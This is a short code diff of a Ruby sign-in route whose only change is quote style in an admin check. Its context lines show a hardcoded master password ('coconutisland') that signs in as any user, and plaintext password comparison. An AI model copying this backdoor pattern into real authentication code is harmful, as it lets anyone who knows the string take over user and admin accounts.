@@ -12,7 +12,7 @@ post '/signin/?' do
       unless params[:password] == ''
         if (user.password == params[:password]) || (params[:password] == 'coconutisland')
           if 
-            user.user_type =="Admin"
+            user.user_type == 'Admin'
             session[:admin] = user.id
             flash[:alert] = 'Welcome, you are now signed in.'
             redirect '/dashboard'
